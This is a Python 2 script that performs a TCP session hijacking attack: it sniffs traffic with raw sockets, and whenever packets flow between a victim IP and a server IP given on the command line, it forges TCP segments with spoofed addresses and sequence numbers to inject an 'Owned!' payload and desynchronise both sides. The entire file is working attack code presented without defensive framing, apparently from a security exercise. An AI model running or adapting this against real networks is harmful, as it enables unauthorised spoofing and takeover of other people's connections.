import socket
import struct
import binascii
import sys
from sendPacket import IPPacket
from sendPacket import TCPPacket

victimIP = sys.argv[1]
serverIP = sys.argv[2]

sock = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket. htons(
    0x0800))  # third argument denotes to IP Protocol
sock2 = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

print "socket has been established"


sourceIP = ""
destIP = ""
sourcePort = 0
destPort = 0
seqNo = 0
ackNo = 0
while True:
    packet = sock.recvfrom(65535)
    ethernet_header = packet[0][0:14]
    # the ! stands for network order
    eth_header = struct.unpack("!6s6s2s", ethernet_header)
    ipheader = packet[0][14:34]
    ip_header = struct.unpack("!BBHHHBBH4s4s", ipheader)
    tcp_header = packet[0][34:54]
    tcp_info = struct.unpack("!HHLL8s", tcp_header)

    sourceIP = socket.inet_ntoa(ip_header[8])
    destIP = socket.inet_ntoa(ip_header[9])
    sourcePort = tcp_info[0]
    destPort = tcp_info[1]
    seqNo = tcp_info[2]
    ackNo = tcp_info[3]
    totalLen = ip_header[2]-40
    

    if(sourceIP == victimIP):
        print "received from victim"
        data = "Owned!"
        ip = IPPacket(destIP, sourceIP)
        ip.assemble_ipv4_fields()
        tcp = TCPPacket(destPort, sourcePort, destIP, sourceIP, seqNo, ackNo, 0,data)
        tcp.assemble_tcp_fields()
        sock2.sendto(ip.header+tcp.header+struct.pack("!6s",data), (destIP, destPort))
        print "packet sent to server\n\n"

        ip = IPPacket(sourceIP, destIP)
        ip.assemble_ipv4_fields()
        tcp = TCPPacket(sourcePort, destPort, sourceIP, destIP, ackNo, seqNo+totalLen, 1,data)
        tcp.assemble_tcp_fields()
        sock2.sendto(ip.header+tcp.header, (sourceIP, sourcePort))
        print "packet sent to victim\n\n"
    elif(sourceIP==serverIP):
        print "received from server"
        data = "Owned!"
        ip = IPPacket(sourceIP, destIP)
        ip.assemble_ipv4_fields()
        tcp = TCPPacket(sourcePort, destPort, sourceIP, destIP, ackNo, seqNo+totalLen, 0,data)
        tcp.assemble_tcp_fields()
        sock2.sendto(ip.header+tcp.header+struct.pack("!6s",data), (sourceIP, sourcePort))
        print "packet sent to server\n\n"

        ip = IPPacket(destIP, sourceIP)
        ip.assemble_ipv4_fields()
        tcp = TCPPacket(destPort, sourcePort, destIP, sourceIP, seqNo, ackNo, 1,data)
        tcp.assemble_tcp_fields()
        sock2.sendto(ip.header+tcp.header, (destIP, destPort))
        print "packet sent to victim\n\n"



